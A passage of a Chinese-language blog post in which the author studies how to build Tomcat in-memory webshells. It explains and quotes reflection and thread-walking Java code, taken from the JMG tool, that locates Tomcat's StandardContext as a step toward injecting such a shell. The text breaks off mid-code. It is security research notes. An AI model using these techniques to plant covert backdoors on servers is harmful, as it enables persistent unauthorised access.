{"title":"Memshell再研究之Tomcat","uid":"6cf97800911b20cad32c0edf8a53c839","slug":"Memshell再研究","date":"2024-08-04T04:37:11.000Z","updated":"2024-08-04T04:40:42.429Z","comments":true,"path":"api/articles/Memshell再研究.json","keywords":null,"cover":"https://bu.dusays.com/2024/08/04/66af064092887.png","content":"<p>之前学习的通过反序列化或者其他能够代码执行的内存马回显技术，在一定版本下以及一定实验环境下，已经足够好用。但是问题在于如果我们放到JDK11或更高版本，以及实战情况下，这个时候内存马构造的代码就不够看了，并且在大多数攻防情况下，注入一段内存马还是硬道理。于是这段笔记用来记录我学习JMG和其他实战场景下的内存马构造。</p>\n<h1 id=\"获取StandardContext的思路总结\"><a href=\"#获取StandardContext的思路总结\" class=\"headerlink\" title=\"获取StandardContext的思路总结\"></a>获取StandardContext的思路总结</h1><p>目前存在如下方法：<br>1.从request对象反射出ApplicationContext，然后获取StandardContext。问题在于如何获取request。一是通过ThreadLocal属性获取，而是通过global属性获取。这个方法如果在JDK8下是完全没问题的，由于我个人能力原因JDK11下某些反射之后得到的对象不能够强转的问题而搁置。如果存在能够解析JSP的情况，这个方法就能够快速获取到request对象，从而快速获取到StandardContext，之前学习Memshell回显技术就是基于获取request的思路基础上进行的。<br>2.直接从ContextClassLoader中获取。ContextClassLoader，这里是指WebappClassLoaderBase，具体作用是Tomcat为了隔离每个webservice容器中类加载的问题，所以每个web容器会内置一个ClassLoader。之后就可以调用WebappClassLoaderBase的getResources方法，获取StandardRoot，再通过StandardRoot的getContext方法获取到StandardContext。代码也很简单实现：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">ClassLoader</span><span style=\"color: #B392F0\"> webappClassLoader</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentThread()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> webResourceRootfield</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">loader</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">WebappClassLoaderBase</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;resources&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">webResourceRootfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> standardRoot</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">webResourceRootfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(webappClassLoader);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> standardfield</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.webresources.StandardRoot&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;context&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">standardfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> standardContext</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">standardfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(standardRoot);</span></span></code></pre></div><p>不过肯定还能再简化。<br>3.遍历线程，去寻找存有standardContext的线程，并层层获取到standardContext或者它的子类–TomcatEmbeddedContext。其实遍历线程并不仅仅只有这么一个作用，在遇到了snakeyaml的ScriptEngineManager形式的加载内存马时，由于ScriptEngineManager在初始化SeviceLoader用于加载服务类时，会单独指定一段 ClassLoader（该 ClassLoader 没有明确设定 Tomcat 的类路径） 并且开一段新线程用来加载，这就导致我们执行构造内存马的代码时，如果存在Class.forName这种需要ClassLoader进行类加载的时候，光秃秃的 URLClassLoader 可定加载不到指定的 Tomcat 类的情况。<br>所以遍历线程获取StandardContxt的方法是最实用的，也是我本次学习的重点。</p>\n<p>有几点详情：getFV 是通过反射将值取出，getF 是反射获取到对应值的 Field，以及 invokemethod 也是通过反射调用的</p>\n<h1 id=\"详解遍历线程获取StandardContext\"><a href=\"#详解遍历线程获取StandardContext\" class=\"headerlink\" title=\"详解遍历线程获取StandardContext\"></a>详解遍历线程获取StandardContext</h1><p>具体的代码实现，这是我从JMG中得到的获取Context的具体方法：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Set&lt;</span><span style=\"color: #B392F0\">Object</span><span style=\"color: #F97583\">&gt;</span><span style=\"color: #B392F0\"> getContext() throws IllegalAccessException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> NoSuchMethodException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> InvocationTargetException &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Set</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; contexts </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> HashSet();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Thread</span><span style=\"color: #B392F0\">[] threads </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Thread</span><span style=\"color: #B392F0\">[])invokeMethod(</span><span style=\"color: #79B8FF\">Thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;getThreads&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Thread</span><span style=\"color: #B392F0\">[] var4 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> threads;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">int</span><span style=\"color: #B392F0\"> var5 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">threads</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">length</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">for</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">int</span><span style=\"color: #B392F0\"> var6 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F8F8F8\">0</span><span style=\"color: #B392F0\">; var6 </span><span style=\"color: #F97583\">&lt;</span><span style=\"color: #B392F0\"> var5; </span><span style=\"color: #F97583\">++</span><span style=\"color: #B392F0\">var6) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">Thread</span><span style=\"color: #B392F0\"> thread </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> var4[var6];</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;ContainerBackgroundProcessor&quot;</span><span style=\"color: #B392F0\">) </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">==</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\"> childrenMap </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (HashMap)getFV(getFV(getFV(thread</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;target&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;this$0&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;children&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Iterator</span><span style=\"color: #B392F0\"> var9 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">childrenMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">keySet()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">iterator();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">while</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">var9</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext()) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> key </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">var9</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\"> children </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (HashMap)getFV(</span><span style=\"color: #79B8FF\">childrenMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(key)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;children&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">Iterator</span><span style=\"color: #B392F0\"> var12 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">children</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">keySet()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">iterator();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">while</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">var12</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext()) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> key1 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">var12</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">children</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(key1);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;StandardContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;TomcatEmbeddedContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125; </span><span style=\"color: #F97583\">else</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader() </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toString()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;ParallelWebappClassLoader&quot;</span><span style=\"color: #B392F0\">) </span><span style=\"color: #F97583\">||</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toString()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;TomcatEmbeddedWebappClassLoader&quot;</span><span style=\"color: #B392F0\">))) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> getFV(getFV(</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader()</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;resources&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;context&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;StandardContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;TomcatEmbeddedContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> contexts;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125; </span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> var14) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">throw</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> RuntimeException(var14);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span></code></pre></div><p>总体其实就两个部分，一个是for循环遍历整个线程，二是判断当前遍历的线程是否为ContainerBackgroundProcessor，以及当前线程下的ClassLoader是否为ParallelWebappClassLoader或TomcatEmbeddedWebappClassLoader。<br>我们一个一个来说：</p>\n<h2 id=\"0x01-ContainerBackgroundProcessor\"><a href=\"#0x01-ContainerBackgroundProcessor\" class=\"headerlink\" title=\"0x01 ContainerBackgroundProcessor\"></a>0x01 ContainerBackgroundProcessor</h2><p>抛开它在 Tomcat 中的作用，单论内存马构造，如果是 Tomcat678 的版本，ContainerBackgroundProcessor 是我们第一首选获取到的线程。（tomcat9 中它并不是不起作用了，而是从线程中获取不到了）<br>具体作用：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><strong>Tomcat的Engine会启动一个线程（就是ContainerBackgroundProcessor），该线程每10s会发送一个发送一个事件，监听到该事件的部署配置类会自动去扫描webapp文件夹下的war包，将其加载成一个Context，即启动一个web服务。同时，该线程还会调用子容器Engine、Host、Context、Wrapper各容器组件及与它们相关的其它组件的backgroundProcess方法。</strong></p></blockquote>\n<p>功能决定了它其中必定封装了 StandardContext<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1722664955806-b4acaeaf-2c90-4f2e-9f05-095b97c1fb3f.png#averageHue=%23313337&clientId=u831cbf1e-60c3-4&from=paste&height=342&id=u3081b895&originHeight=642&originWidth=1277&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182991&status=done&style=none&taskId=ua83d4f80-fd0f-444c-a66b-e1a1edcc776&title=&width=681.0666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>如何去取呢？我们观察上面这张图的取值结构，ContainerBackgroundProcessor 名称的 thread 中，属性值 target 封装了 ContainerBackgroundProcessor，将它取出之后，此时的 ContainBase 的具体实现是 StandardEngine，也就是说我们此时通过取出 ContainerBackgroundProcessor 的外部类，就能取到 StandardEngine，之后就是 StandardEngine-&gt;StandardHost-&gt;StandardContext 的顺序取出了<br>在 JMG 生成的 getContext 的具体代码中,具体就是第一段 if 了</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;ContainerBackgroundProcessor&quot;</span><span style=\"color: #B392F0\">) </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">==</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\"> childrenMap </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (HashMap)getFV(getFV(getFV(thread</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;target&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;this$0&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;children&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Iterator</span><span style=\"color: #B392F0\"> var9 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">childrenMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">keySet()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">iterator();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">while</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">var9</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext()) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> key </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">var9</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\"> children </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (HashMap)getFV(</span><span style=\"color: #79B8FF\">childrenMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(key)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;children&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">Iterator</span><span style=\"color: #B392F0\"> var12 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">children</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">keySet()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">iterator();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">while</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">var12</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext()) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> key1 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">var12</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">children</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(key1);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: 